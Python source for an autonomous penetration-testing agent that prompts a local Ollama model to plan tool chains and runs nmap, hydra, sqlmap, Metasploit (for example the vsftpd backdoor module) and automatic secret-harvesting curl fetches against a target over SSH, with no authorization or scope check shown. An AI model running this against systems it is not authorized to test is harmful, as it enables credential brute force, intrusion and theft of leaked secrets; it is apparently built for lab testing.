"""Merged orchestrator: talks to Ollama, decides what to run, and dispatches
tool calls directly to tools.py (in-process -- no more HTTP hop to a separate
mcp_server.py). Retargeted from LM Studio + local Kali execution to Ollama
(native /api/chat, structured JSON output) + remote execution over SSH,
either directly on the Kali box or via `docker exec` into a container there
(tools.py / remote_exec.py decide which, per CONFIG.EXEC_MODE).
"""

import json
import re
import requests
from datetime import datetime

from config import CONFIG, ConfigError
import logging_setup
import tools
from agent_cache import NegativeCache
from logger import AgentLogger
import report_generator

SYSTEM_PROMPT = """You are an autonomous penetration testing agent.

AVAILABLE TOOLS — use EXACTLY these parameter names, every tool call must
include its real parameters (the schema allows extra fields, but a tool call
with no target/url/filename etc. will simply fail):
- run_command: command
- run_masscan: target, ports (default "1-65535"), rate (default "1000")
- run_nmap: target, flags (default "-sV")
- run_netstat: flags (default "-tuln")
- run_sqlmap: target, technique (default "B"), dbms, level (default "1"), risk (default "1")
- run_nikto: target, port (default "80"), ssl (bool)
- run_hydra: target, service, username (required, never ""; guess "root"/"admin"/"administrator" if unknown), wordlist, threads (default "16")
- run_searchsploit: keyword, type
- run_curl: url, method (default "GET"), headers, data
- run_wget: url, output, recursive (bool)
- write_file: filename, content
- read_file: filename
- run_john: hash_file, wordlist, format
- run_ncrack: target, service (default "ssh"), users (comma-separated), wordlist
- run_gobuster: target, wordlist (omit to use a working default; if you set
  it, use exactly "/usr/share/seclists/Discovery/Web-Content/common.txt"),
  mode (default "dir")
- run_enum4linux: target
- run_medusa: target, service (default "ssh"), username (required, never ""; guess "root"/"admin"/"administrator" if unknown), wordlist
- run_setoolkit: attack_type (default "1"), target
- run_subfinder: domain, silent (bool, default true)
- run_nuclei: target, templates, severity
- run_katana: target, depth (default "3")
- run_ffuf: url, wordlist (same guidance as run_gobuster above), param (default "FUZZ")
- run_httpx: target, flags
- run_metasploit: commands (raw msfconsole commands, separated by "; ", e.g.
  "search vsftpd 2.3.4; use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS
  10.0.0.5; set RPORT 21; run"). Use "search <keyword>" first if you don't
  already know the exact module path -- its output tells you the real path
  to "use".

HYDRA SERVICE NAMES - use EXACTLY these:
- FTP: "ftp"
- SSH: "ssh"
- Telnet: "telnet" — SKIP telnet brute force, too slow, low value
- MySQL: "mysql"
- VNC: "vnc"
- PostgreSQL: "postgres"
- SMB: "smb"
- HTTP: "http-get"

HYDRA WORDLISTS - use these in order of speed:
- Fast: "/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
- Medium: "/usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt"
- Full: "/usr/share/wordlists/rockyou.txt" — ONLY use if fast and medium lists fail, and only for high-value services like SSH and FTP. NEVER use on telnet or slow protocols.

CVE / KNOWN-EXPLOIT WORKFLOW: whenever recon (nmap -sV) identifies a
service name AND version string, that is a strong signal to check for known
vulnerabilities before trying blind credential brute force:
  1. If you intend to follow up with run_metasploit, do the lookup with
     run_metasploit itself FIRST: commands="search <service> <version>" or
     "search cve:<CVE-ID>" (search only -- no "use" yet). This queries
     Metasploit's own module database, so any hit is a real, exact module
     path you can copy verbatim into your next run_metasploit step. Do NOT
     invent a module path from memory -- if you cannot search first, say so
     via run_command/recon instead of guessing a path that may not exist.
  2. run_searchsploit with "keyword" = "<service> <version>" is a separate,
     broader database of raw PoC scripts/binaries, NOT Metasploit module
     names -- useful when no Metasploit module exists, but its results
     belong in run_command (e.g. fetch and run the PoC script), never
     copied in as a run_metasploit module path.
  3. If a real, specific matching exploit appears in the results (or you
     already know the module path), follow up with run_metasploit to
     actually attempt it -- a search alone does not run anything.
This applies to every service with a detected version, not just unusual
ones -- do this before or alongside credential brute force, not instead of
picking a real tool.

CREDENTIAL TOOLS (hydra, medusa, ncrack): if no specific username is known,
guess common defaults such as "root", "admin", "administrator" -- never leave
username/users blank, an empty username fails immediately.

WHEN ASKED TO EXPLOIT A PORT, YOU ALREADY KNOW IT IS OPEN -- re-running
run_nmap/run_masscan on it again is NOT an attempt and NEVER counts as
progress. Pick a REAL exploitation/enumeration tool based on the port:
- 21 (FTP), 22 (SSH): run_hydra or run_medusa or run_ncrack (credential brute force)
- 23 (Telnet): SKIP, not worth attacking
- 80, 443, 3000, 8000, 8080, and other likely web ports: run_gobuster or
  run_ffuf (directory brute force), run_nikto (vuln scan), run_sqlmap (if a
  form/query param is visible), run_nuclei (template-based vuln scan)
- 139, 445 (SMB): run_enum4linux, then run_hydra/run_medusa with service "smb"
- 3306 (MySQL), 5432 (PostgreSQL): run_hydra with the matching service name
- Anything unrecognized: run_searchsploit with the service/version string
  from recon, or run_command to interact with it directly (e.g. curl-style
  probes) -- but still make an actual attempt, not another scan.
- Any port with a detected service+version: also consider run_searchsploit
  then run_metasploit per the CVE/KNOWN-EXPLOIT WORKFLOW below -- this is
  often more direct than credential brute force.

Respond with a tool chain using each tool's REAL parameter names from the list
above. Format example (a web-port EXPLOIT chain, not a re-scan -- this is
the shape your response should take when the goal says "exploit this
port"): {"chain": [{"tool": "run_gobuster", "target": "http://10.0.0.5", "mode": "dir"}, {"tool": "run_sqlmap", "target": "http://10.0.0.5/login.php?id=1", "level": "2", "risk": "1"}]}
Never invent generic names like "param1"/"param2" -- use the exact names listed above."""

# Constrains chain[].tool to a real, current tool name -- the model can no
# longer hallucinate a nonexistent tool, which is the direct fix for the
# SUPPORTED_TOOLS/SYSTEM_PROMPT/README drift this repo had before. Ollama
# enforces this via the request's "format" field, so parse_model_response no
# longer has to defensively parse untrusted free-text JSON.
#
# "additionalProperties": true is NOT optional decoration here -- Ollama's
# grammar-constrained decoder (verified empirically against a real model)
# treats a missing additionalProperties as false: without this flag it
# silently drops every tool param (target, service, wordlist, ...) and only
# ever emits {"tool": "..."} , which then fails every _run_* method's
# required-param check. Confirmed the flag fixes it before relying on it.
CHAIN_JSON_SCHEMA = {
    "type": "object",
    "properties": {
        "chain": {
            "type": "array",
            "items": {
                "type": "object",
                "properties": {
                    "tool": {"type": "string", "enum": tools.SUPPORTED_TOOLS},
                },
                "required": ["tool"],
                "additionalProperties": True,
            },
        }
    },
    "required": ["chain"],
}

log = None
agent_logger = None
executor = tools.ToolExecutor()

def _detect_exploit_success(tool, output):
    """Tool-specific success detection.

    A shared keyword list ("password"/"login"/"found"/...) is NOT reliable:
    confirmed against a real target that medusa prints "Password: X" for
    EVERY attempted password whether it works or not, so a generic
    "password" match reported a full 999-word failed brute-force run as a
    successful breach. searchsploit's own boilerplate footer ("Shellcodes:
    No Results") separately matched "shell" for the same reason. Recon/
    lookup tools (searchsploit, nmap, gobuster, nikto, ...) are excluded
    entirely -- they can never themselves indicate a landed exploit -- and
    each remaining tool is checked against its own real, specific success
    marker instead of a word that also appears in ordinary failure output.
    """
    if tool == "run_hydra":
        # Hydra only prints a "[port][service] host: ... login: ...
        # password: ..." line for an actual hit -- unlike medusa/ncrack it
        # does not echo per-attempt progress to stdout by default.
        return bool(re.search(r"\[\d+\]\[\w+\]\s+host:.*login:.*password:", output, re.IGNORECASE))
    if tool == "run_medusa":
        return "ACCOUNT FOUND" in output
    if tool == "run_ncrack":
        return "Discovered credentials" in output
    if tool == "run_john":
        m = re.search(r"(\d+)\s+password hash(?:es)?\s+crack", output, re.IGNORECASE)
        return bool(m) and int(m.group(1)) > 0
    if tool == "run_sqlmap":
        lowered = output.lower()
        return "is vulnerable" in lowered or "the back-end dbms is" in lowered
    if tool == "run_metasploit":
        # A session actually opening is msfconsole's own definitive
        # "it worked" signal -- an exploit that merely "completed" without
        # opening a session is not a landed exploit.
        return bool(re.search(r"session\s+\d+\s+opened", output, re.IGNORECASE))
    return False


def bootstrap():
    """Validate config and stand up logging. Must run before anything else."""
    global log, agent_logger
    CONFIG.validate()
    log, log_file, session_id = logging_setup.setup_logger()
    agent_logger = AgentLogger(session_id=session_id)
    log.info(f"[START] SECURITY AGENT SESSION {session_id}")
    log.info(f"[FILE] Log file: {log_file}")
    return log_file


class AgentMemory:
    def __init__(self):
        self.open_ports = []
        self.tried_ports = []
        self.successful_attacks = []
        self.failed_attacks = []
        self.findings = []

    def add_ports(self, ports):
        for p in ports:
            if p not in self.open_ports:
                self.open_ports.append(p)
        log.info(f"[MEMORY] Open ports discovered: {self.open_ports}")

    def add_finding(self, port, tool, detail):
        self.findings.append({
            "port": port, "tool": tool, "detail": detail[:2000],
            "time": datetime.now().strftime("%H:%M:%S"),
        })
        log.info(f"[SUCCESS] Port {port} → {tool}: {detail[:2000]}")

    def next_untried_port(self):
        for p in self.open_ports:
            if p not in self.tried_ports:
                return p
        return None

    def mark_tried(self, port, success=False):
        if port not in self.tried_ports:
            self.tried_ports.append(port)
        if success:
            self.successful_attacks.append(port)
            log.info(f"[SUCCESS] Exploit landed on port {port}")
        else:
            self.failed_attacks.append(port)
            log.warning(f"[FAIL] Nothing worked on port {port}")

    def has_untried_ports(self):
        return any(p not in self.tried_ports for p in self.open_ports)

    def recent_failed_attacks(self, limit=10):
        """Bounded view of failed_attacks for embedding in a model prompt --
        the raw list is unbounded and would otherwise grow every prompt for
        the rest of the engagement, eating into a small context window."""
        if len(self.failed_attacks) <= limit:
            return str(self.failed_attacks)
        shown = self.failed_attacks[-limit:]
        return f"{shown} (and {len(self.failed_attacks) - limit} more)"

    def summary(self):
        return {
            "open_ports": self.open_ports, "tried": self.tried_ports,
            "successes": self.successful_attacks, "failures": self.failed_attacks,
            "findings": self.findings,
        }


def estimate_prompt_tokens(system_prompt, goal):
    """Cheap chars/4 heuristic -- no tokenizer dependency needed for a
    warning-level check against a quantized model's limited context."""
    return (len(system_prompt) + len(goal)) // 4


def parse_model_response(raw):
    """Ollama's `format` schema guarantees `raw` is valid JSON matching
    CHAIN_JSON_SCHEMA, so this is now just json.loads with a narrow
    fallback for genuinely exceptional cases (empty response, network
    hiccup surfaced as non-JSON) -- not a defensive markdown/brace parser."""
    try:
        return json.loads(raw)
    except Exception as e:
        log.error(f"[ERROR] JSON parse failed: {e}")
        return {"chain": []}


def call_model(goal):
    log.info(f"[MODEL] Thinking about: {goal[:80]}...")

    est_tokens = estimate_prompt_tokens(SYSTEM_PROMPT, goal)
    if est_tokens > CONFIG.OLLAMA_NUM_CTX * 0.8:
        log.warning(
            f"[MODEL] Prompt (~{est_tokens} tokens est.) is approaching "
            f"OLLAMA_NUM_CTX={CONFIG.OLLAMA_NUM_CTX} — consider trimming."
        )

    payload = {
        "model": CONFIG.OLLAMA_MODEL,
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": goal},
        ],
        "stream": False,
        "format": CHAIN_JSON_SCHEMA,
        "options": {
            # 0.3 matches BaronLLM's own recommended setting for
            # "deterministic reasoning tasks" -- low enough to stay
            # conservative, but enough room to pick a different pentest tool
            # when the first choice stalls or conflicts, which matters for
            # this semi-creative, adaptive tool-chaining task.
            "temperature": 0.3,
            "top_p": 0.9,
            "num_ctx": CONFIG.OLLAMA_NUM_CTX,
        },
    }
    try:
        response = requests.post(
            f"{CONFIG.OLLAMA_HOST}/api/chat", json=payload, timeout=CONFIG.EXEC_TIMEOUT_SECONDS
        )
        response.raise_for_status()
        raw = response.json()["message"]["content"]
        log.info("[MODEL] Response received ✅👍")
        parsed = parse_model_response(raw)
        agent_logger.log_decision(reasoning=goal, chosen_action=parsed)
        return parsed
    except Exception as e:
        log.error(f"[ERROR] Model call failed: {e}")
        agent_logger.log_error("ollama_call", str(e))
        return {"chain": []}


def extract_ports(output):
    ports = re.findall(r'(\d+)/tcp\s+open|(\d+)/udp\s+open|port\s+(\d+)|open port (\d+)', output, re.IGNORECASE)
    found = []
    for match in ports:
        port = next(p for p in match if p)
        if port not in found:
            found.append(port)
    return found


# A freeform goal that explicitly restricts scanning to a port subset (e.g.
# "restrict all scanning ... to only ports 21, 80, and 443") is NOT reliably
# honored by either registered model as a single planned `chain` -- verified
# empirically in reports/stage3_model_burndown_20260916.md, finding #4 (one
# model widened the range instead of narrowing it, the other ignored the
# restriction entirely). The only pathway that reliably respects an explicit
# port list is the deterministic `run_full_engagement(ports=...)` used by
# the `engage <target> <ports>` REPL command -- so detect this same intent
# in freeform text and route to that pathway instead of trusting the model.
_TARGET_HOST_RE = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b|\b[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b')
_PORT_SCOPE_RE = re.compile(
    r'\b(?:only|restrict\w*|limit\w*|just)\b.{0,40}?\bports?\b[^.]{0,40}?'
    r'((?:\d{1,5}(?:\s*,?\s*(?:and\s+)?)?)+)',
    re.IGNORECASE,
)


def detect_scoped_engagement(goal):
    """Returns (target, ports) if `goal` both names a target and explicitly
    restricts scanning to specific ports, else None. See module comment
    above `_PORT_SCOPE_RE` for why this exists instead of just trusting the
    model to honor the restriction itself."""
    scope_match = _PORT_SCOPE_RE.search(goal)
    if not scope_match:
        return None
    target_match = _TARGET_HOST_RE.search(goal)
    if not target_match:
        return None
    ports = re.findall(r'\d{1,5}', scope_match.group(1))
    if not ports:
        return None
    return target_match.group(0), ",".join(ports)


def execute_step(step):
    tool = step.get("tool", "unknown")
    params = {k: v for k, v in step.items() if k != "tool"}
    start_time = datetime.now()
    log.info(f"[TOOL] Running → {tool} | params: {params}")
    try:
        result = executor.execute_tool(tool, params)
        output = result.get("stdout", "")
        status = result.get("status", "")
        duration = (datetime.now() - start_time).seconds
        if status == "success":
            log.info(f"[TOOL] ✅👍 {tool} completed in {duration}s")
            if output:
                log.info(f"[TOOL] Output preview: {output[:200]}")
        else:
            log.warning(f"[FAIL] 😤💀 {tool} failed after {duration}s → {result.get('message', 'unknown error')}")
        agent_logger.log_tool_call(tool, params, result)
        return output, status == "success"
    except Exception as e:
        log.error(f"[ERROR] 😭🔥 {tool} exception: {e}")
        agent_logger.log_error(tool, str(e))
        return "", False


# Common UDP-only services -- nmap's default scan (TCP-only) reports these
# as "closed" even when they're genuinely up, since it never actually probes
# UDP. Ports scoped here get a proper -sU pass alongside the TCP ports.
UDP_PORTS = {"53", "69", "123", "161", "500", "514", "1900"}


def run_recon(target, memory, ports=None):
    log.info(f"[SCAN] Starting recon on {target}")
    if ports:
        # Deterministic path, no model call: when the operator already knows
        # which ports/services they want examined, build the scan directly
        # instead of asking the model to transcribe a port list into tool
        # params -- confirmed unreliable in practice (the model has
        # hallucinated/dropped values in far simpler single-field cases).
        # This is also faster: skips a full 1-65535 masscan sweep.
        log.info(f"[SCAN] Restricting recon to explicit port list: {ports}")
        port_list = [p.strip() for p in ports.split(",") if p.strip()]
        udp_list = [p for p in port_list if p in UDP_PORTS]
        tcp_list = [p for p in port_list if p not in UDP_PORTS]
        if udp_list and tcp_list:
            flags = f"-sV -sT -sU -p T:{','.join(tcp_list)},U:{','.join(udp_list)}"
        elif udp_list:
            flags = f"-sV -sU -p {','.join(udp_list)}"
        else:
            flags = f"-sV -p {','.join(tcp_list)}"
        output, ok = execute_step({"tool": "run_nmap", "target": target, "flags": flags})
        if output:
            found = extract_ports(output)
            if found:
                memory.add_ports(found)
                log.info(f"[SCAN] 🎉😄 Found {len(found)} open ports: {found}")
            else:
                log.warning("[SCAN] 😤💀 No ports found in output")
        return

    goal = f"Scan {target} with masscan then nmap to find all open ports and services."
    data = call_model(goal)
    for step in data.get("chain", []):
        output, ok = execute_step(step)
        if output:
            found = extract_ports(output)
            if found:
                memory.add_ports(found)
                log.info(f"[SCAN] 🎉😄 Found {len(found)} open ports: {found}")
            else:
                log.warning("[SCAN] 😤💀 No ports found in output")


# How many times the model gets to re-plan against the SAME port after a
# chain finishes with no landed exploit. Added because single-shot planning
# (one model call -> one chain -> done) was confirmed to silently discard
# real recon findings: on a real DVWA run, run_gobuster/run_nikto found an
# indexable /config/ directory and a login.php redirect chain, neither tool
# counts as an "exploit" by design (_detect_exploit_success excludes recon
# tools on purpose), and the loop just gave up on the port with that lead
# sitting unused. This lets the model see its own prior results and decide
# whether to keep pulling the thread -- capped, not unbounded, specifically
# so a repeated/empty response (the model's own "nothing left" signal) is
# visible and stops the loop rather than running forever against a genuine
# dead end.
MAX_ATTACK_ROUNDS = 5


def _run_chain_against_port(chain, port, memory, cache, goal):
    """Execute one model-planned chain against a port (identical step-
    execution logic to before this function existed -- extracted so
    run_attack_loop can call it once per round). Returns (success,
    round_log_lines): round_log_lines is a compact, deterministic per-step
    record (tool + real compressed output) meant to be fed verbatim into a
    follow-up round's prompt, not an LLM-generated summary -- same reasoning
    as compress_tool_output's own docstring.
    """
    success = False
    corrected_once = False
    round_log_lines = []
    step_outputs = []
    i = 0
    while i < len(chain):
        step = chain[i]
        tool = step.get("tool")
        if cache and not cache.should_attempt(step):
            log.warning(f"[MEMORY] 🚫 Skipping permanently blocked step: {tool}")
            round_log_lines.append(f"  [{tool}] SKIPPED (permanently blocked by an earlier identical failure)")
            i += 1
            continue
        output, ok = execute_step(step)
        if ok and output:
            step_outputs.append((tool, output))
        exploited = bool(ok and output and _detect_exploit_success(tool, output))
        if exploited:
            success = True
            if cache:
                cache.record_success(step)
            memory.add_finding(port, tool, output)
        elif not ok:
            if cache:
                reason = f"tool={tool} port={port} output_empty={not bool(output)}"
                cache.record_failure(step, reason=reason)
        status = "EXPLOIT SUCCESS" if exploited else ("ran, no breach" if ok else "FAILED")
        round_log_lines.append(
            f"  [{tool}] {status}: {compress_tool_output(output, max_lines=8) if output else '(no output)'}"
        )
        if not corrected_once:
            correction = _maybe_correct_exploit_selection(goal, chain, i, step, output)
            if correction is not None:
                chain = chain[:i + 1] + correction
                corrected_once = True
        i += 1
        if success:
            break
    return success, round_log_lines, step_outputs


# --- Deterministic recon-lead escalation ------------------------------------
# kali-network-model-6w8 confirmed the model will not convert a discovered
# directory/redirect into an actual fetch even when the follow-up prompt
# explicitly tells it to (round 2 of that test was handed the exact
# "/config/ found, fetch it" lead in plain text and still ran ffuf/nuclei
# instead). Rather than keep tuning the prompt, this follows up on a small
# set of well-known, high-value recon signals itself -- no model call
# involved -- the same "verify with the real tool, don't rely on the model
# noticing" precedent _maybe_correct_exploit_selection already set for a
# different case. Grounded in a real check against 172.17.0.12: gobuster/
# nikto finding "/config/" with directory indexing on led straight to a
# world-readable config.inc.php.bak leaking real DB credentials -- exactly
# the kind of lead a human tester chases without needing to be told to.
_DIR_LISTING_SIGNATURE = re.compile(r"<title>Index of ", re.IGNORECASE)
_HREF_RE = re.compile(r'href="([^"?][^"]*)"', re.IGNORECASE)
_GOBUSTER_DIR_RE = re.compile(r"^(\S+)\s+\(Status:\s*301\)", re.MULTILINE)
_NIKTO_INDEXING_RE = re.compile(r"\+\s*\[\d+\]\s*(/\S+?):\s*Directory indexing found", re.IGNORECASE)
_SECRET_PATTERNS = re.compile(
    r"(db_password|password|passwd|secret_key|api_key|access_key|"
    r"private_key|BEGIN (?:RSA |EC |DSA )?PRIVATE KEY|aws_secret|"
    r"authorization:\s*bearer)",
    re.IGNORECASE,
)
MAX_AUTO_CURL_DIRS = 3
MAX_AUTO_CURL_FILES_PER_DIR = 5


def _extract_directory_leads(base_url, tool, output):
    """Deterministic extraction of real, indexable-looking directory paths
    from recon tool output -- gobuster's 301-redirect-to-subdirectory
    entries, nikto's explicit "Directory indexing found" flags. Returns
    absolute URLs."""
    leads = set()
    if not output:
        return leads
    base = base_url.rstrip("/")
    if tool == "run_gobuster":
        for name in _GOBUSTER_DIR_RE.findall(output):
            leads.add(f"{base}/{name.strip('/')}/")
    if tool == "run_nikto":
        for path in _NIKTO_INDEXING_RE.findall(output):
            leads.add(f"{base}{path}")
    return leads


def _deterministic_recon_escalation(base_url, port, memory, cache, step_outputs):
    """After a round's model-planned chain runs, deterministically fetch
    any indexed directories it (or nikto) found, and any files listed
    inside them, checking each for an obvious leaked secret. Returns
    (success, escalation_log_lines) in the same shape _run_chain_against_port
    returns, so it can be folded into the same round history.
    """
    leads = set()
    for tool, output in step_outputs:
        leads |= _extract_directory_leads(base_url, tool, output)
    if not leads:
        return False, []

    success = False
    log_lines = []
    for dir_url in sorted(leads)[:MAX_AUTO_CURL_DIRS]:
        dir_step = {"tool": "run_curl", "url": dir_url, "method": "GET"}
        if cache and not cache.should_attempt(dir_step):
            continue
        log.info(f"[ESCALATE] 🔗 Auto-fetching discovered directory: {dir_url}")
        output, ok = execute_step(dir_step)
        if not ok or not output or not _DIR_LISTING_SIGNATURE.search(output):
            log_lines.append(f"  [auto-curl] {dir_url}: not an indexable directory listing")
            continue
        files = [f for f in _HREF_RE.findall(output) if not f.startswith("?") and f != "/" and not f.endswith("/")]
        log_lines.append(f"  [auto-curl] {dir_url}: directory listing exposed, files: {files[:10]}")
        memory.add_finding(port, "run_curl (auto directory-listing)", f"{dir_url} exposes: {files}")
        for fname in files[:MAX_AUTO_CURL_FILES_PER_DIR]:
            file_url = dir_url.rstrip("/") + "/" + fname
            file_step = {"tool": "run_curl", "url": file_url, "method": "GET"}
            if cache and not cache.should_attempt(file_step):
                continue
            log.info(f"[ESCALATE] 🔗 Auto-fetching listed file: {file_url}")
            file_output, file_ok = execute_step(file_step)
            if file_ok and file_output and _SECRET_PATTERNS.search(file_output):
                success = True
                if cache:
                    cache.record_success(file_step)
                memory.add_finding(
                    port, "run_curl (auto secret-leak)",
                    f"{file_url}:\n{compress_tool_output(file_output, max_lines=20)}",
                )
                log.info(f"[SUCCESS] 🎉😄 Auto-escalation found a real secret at {file_url}")
                log_lines.append(
                    f"  [auto-curl] {file_url}: LEAKED CREDENTIALS/SECRET -- "
                    f"{compress_tool_output(file_output, max_lines=5)}"
                )
            elif file_ok and file_output:
                log_lines.append(f"  [auto-curl] {file_url}: fetched, no secret pattern matched")
    return success, log_lines


def run_attack_loop(target, memory, cache=None):
    log.info(f"[ATTACK] Starting attack loop on {target}")
    while memory.has_untried_ports():
        port = memory.next_untried_port()
        log.info(f"[ATTACK] ⚔️  Targeting port {port}")
        base_goal = (
            f"Target: {target} Port: {port}. "
            f"Failed ports: {memory.recent_failed_attacks()}. "
            f"Exploit this port with any available tool. Try multiple tools if needed."
        )
        base_url = f"http://{target}" if str(port) == "80" else f"http://{target}:{port}"
        success = False
        seen_chain_signatures = set()
        history = []
        round_num = 1
        while round_num <= MAX_ATTACK_ROUNDS and not success:
            if round_num == 1:
                goal = base_goal
            else:
                # Only the most recent 2 rounds -- each already capped by
                # compress_tool_output -- to keep this bounded for a small-
                # context model instead of growing every round.
                recent_history = "\n".join(history[-2:])
                goal = (
                    f"{base_goal}\n\n"
                    f"You have already tried {round_num - 1} round(s) on this port with no "
                    f"breach yet:\n{recent_history}\n\n"
                    f"Build on these REAL results -- e.g. if a directory or file was "
                    f"discovered, fetch or inspect it (run_curl/run_command); if a login "
                    f"form or endpoint was found, attack it directly. Do NOT repeat a "
                    f"tool+target you already ran that produced no new lead. If you "
                    f"genuinely have nothing further to try, respond with an empty chain: "
                    f'{{"chain": []}}.'
                )
            log.info(f"[ATTACK] Port {port} round {round_num}/{MAX_ATTACK_ROUNDS}")
            data = call_model(goal)
            chain = data.get("chain", [])
            if not chain:
                log.info(f"[ATTACK] Port {port} round {round_num}: model returned an empty chain (gave up)")
                break

            signature = tuple(sorted((s.get("tool"), s.get("target") or s.get("url") or "") for s in chain))
            if signature in seen_chain_signatures:
                log.warning(
                    f"[ATTACK] Port {port} round {round_num}: model repeated an identical "
                    f"chain with no new information -- stopping (breakdown point)"
                )
                break
            seen_chain_signatures.add(signature)

            success, round_log_lines, step_outputs = _run_chain_against_port(chain, port, memory, cache, goal)

            if not success and step_outputs:
                esc_success, esc_log_lines = _deterministic_recon_escalation(
                    base_url, port, memory, cache, step_outputs
                )
                if esc_log_lines:
                    round_log_lines += esc_log_lines
                if esc_success:
                    success = True
                    log.info(f"[ATTACK] Port {port}: deterministic escalation found a real breach -- skipping further rounds")

            history.append(f"Round {round_num}:\n" + "\n".join(round_log_lines))
            round_num += 1

        if round_num > MAX_ATTACK_ROUNDS and not success:
            log.warning(f"[ATTACK] Port {port}: hit MAX_ATTACK_ROUNDS ({MAX_ATTACK_ROUNDS}) without a breach")
        memory.mark_tried(port, success=success)
    log.info("[ATTACK] Attack loop complete")
    summary = memory.summary()
    log.info(f"[MEMORY] Final summary: {summary}")
    if memory.successful_attacks:
        log.info(f"[SUCCESS] 🎉😄 BREACHED ports: {memory.successful_attacks}")
    else:
        log.warning("[FAIL] 😤💀 No successful breaches this session")


def run_full_engagement(target, ports=None):
    memory = AgentMemory()
    cache = NegativeCache()
    log.info(f"[ENGAGE] 💣 Full engagement started on {target}")
    run_recon(target, memory, ports=ports)
    if memory.open_ports:
        run_attack_loop(target, memory, cache)
    else:
        log.warning("[FAIL] 😤💀 No open ports found — aborting engagement")
    return memory


_ANSI_ESCAPE_RE = re.compile(r'\x1b\[[0-9;]*m')


def compress_tool_output(output, max_lines=15):
    """Deterministic, non-semantic compression for feeding a tool's raw
    output back into a follow-up model prompt -- NOT an LLM-generated
    summary. The whole point of the follow-up call (see
    _maybe_correct_exploit_selection) is to get an exact string back (a
    real Metasploit module path, a real CVE id); running the output through
    another model call to "summarize" it first would reintroduce the same
    hallucination/paraphrasing risk this exists to eliminate. Stripping
    ANSI color codes and capping to the first `max_lines` (search/module
    tables rank best matches first) preserves every surviving string
    byte-for-byte.
    """
    if not output:
        return output
    clean = _ANSI_ESCAPE_RE.sub("", output)
    lines = clean.splitlines()
    if len(lines) <= max_lines:
        return clean
    return "\n".join(lines[:max_lines]) + f"\n... ({len(lines) - max_lines} more lines omitted)"


def _is_search_only_metasploit(commands):
    """True if a run_metasploit `commands` string only queries the module
    database (msfconsole's own `search`) without committing to `use`/`run`/
    `exploit` -- i.e. the model is still looking, not yet acting."""
    lowered = f" {commands.lower()} "
    return "search" in lowered and " use " not in lowered and "exploit -" not in lowered


def _maybe_correct_exploit_selection(goal, chain, idx, step, output):
    """If `step` was a lookup step (run_searchsploit, or a search-only
    run_metasploit call) and the model's own planned chain includes a later
    run_metasploit step, that later step was authored blind -- before this
    lookup ever ran, since a whole chain is planned in one model response.
    reports/stage3_model_burndown_20260916.md confirmed this reliably
    produces a hallucinated or CVE-mismatched module name even when the
    correct answer was sitting in the lookup's own output the model never
    got to read. Re-queries the model with the REAL (compressed) result and
    returns a corrected remainder chain to splice in, or None if no
    correction applies here.
    """
    if not goal or not output:
        return None
    tool = step.get("tool")
    is_lookup_step = tool == "run_searchsploit" or (
        tool == "run_metasploit" and _is_search_only_metasploit(step.get("commands", ""))
    )
    if not is_lookup_step:
        return None
    remaining = chain[idx + 1:]
    if not any(s.get("tool") == "run_metasploit" for s in remaining):
        return None
    followup_goal = (
        f"{goal}\n\n"
        f"You already ran {tool} with params {step} and got this REAL result:\n"
        f"{compress_tool_output(output)}\n\n"
        f"Based on these actual results (not a guess), give the exact next tool "
        f"call to exploit this -- use the real module name/path shown above, "
        f"never an invented one."
    )
    log.info(
        f"[CHAIN] 🔎 Re-querying model with real {tool} results before continuing "
        f"(the rest of this chain was planned blind, before {tool} ran)"
    )
    corrected = call_model(followup_goal)
    return corrected.get("chain", [])


def execute_chain(chain, cache=None, goal=None):
    corrected_once = False
    i = 0
    while i < len(chain):
        step = chain[i]
        log.info(f"[CHAIN] 🔗 Step {i + 1} of {len(chain)}: {step.get('tool')}")
        if cache and not cache.should_attempt(step):
            log.warning(f"[MEMORY] 🚫 Skipping permanently blocked step: {step.get('tool')}")
            i += 1
            continue
        output, ok = execute_step(step)
        if not ok and cache:
            cache.record_failure(step, reason=f"manual chain failure, step {i + 1}")
        if not corrected_once:
            correction = _maybe_correct_exploit_selection(goal, chain, i, step, output)
            if correction is not None:
                chain = chain[:i + 1] + correction
                corrected_once = True
        i += 1


def main():
    log_file = bootstrap()
    cache = NegativeCache()
    log.info("[START] 🚀 AUTONOMOUS SECURITY AGENT ONLINE")
    print("=" * 60)
    print("⚔️   AUTONOMOUS SECURITY AGENT")
    print("=" * 60)
    print("Commands:")
    print("  engage <target> [ports]  - full recon + attack loop")
    print("                             ports: optional comma-separated list")
    print("                             (e.g. 21,53,80,81,82,2222,3306) to")
    print("                             restrict recon instead of a full")
    print("                             1-65535 sweep")
    print("  <any goal>               - single model query")
    print("  exit                     - quit")
    print(f"  📝 Session log: {log_file}")
    print("=" * 60)

    while True:
        try:
            goal = input(">>> ").strip()
            if goal.lower() == "exit":
                log.info("[START] Agent shutdown. Goodbye! 👋")
                break
            if not goal:
                continue
            log.info(f"[GOAL] 🎯 {goal}")
            if goal.startswith("engage "):
                parts = goal.replace("engage ", "").strip().split()
                target = parts[0]
                ports = parts[1] if len(parts) > 1 else None
                run_full_engagement(target, ports=ports)
                log.info("[REPORT] 📝 Engagement complete — generating report")
            else:
                scoped = detect_scoped_engagement(goal)
                if scoped:
                    target, ports = scoped
                    log.info(
                        f"[GOAL] 🎯 Detected explicit port-scope restriction in freeform "
                        f"goal — routing to deterministic engagement instead of a single "
                        f"model-planned chain (target={target}, ports={ports})"
                    )
                    run_full_engagement(target, ports=ports)
                    log.info("[REPORT] 📝 Engagement complete — generating report")
                else:
                    data = call_model(goal)
                    chain = data.get("chain", [])
                    if chain:
                        execute_chain(chain, cache=cache, goal=goal)
                    else:
                        log.warning("[FAIL] 😤💀 No tool chain generated")
        except KeyboardInterrupt:
            log.info("[START] Interrupted by user")
            break
        except Exception as e:
            log.error(f"[ERROR] 😭🔥 Fatal error: {e}")
            break

    agent_logger.close()
    report_path = report_generator.generate(agent_logger.log_file)
    log.info(f"[REPORT] 📝 Report written to {report_path}")


if __name__ == "__main__":
    try:
        main()
    except ConfigError as e:
        print(f"Configuration error:\n{e}")
        raise SystemExit(1)
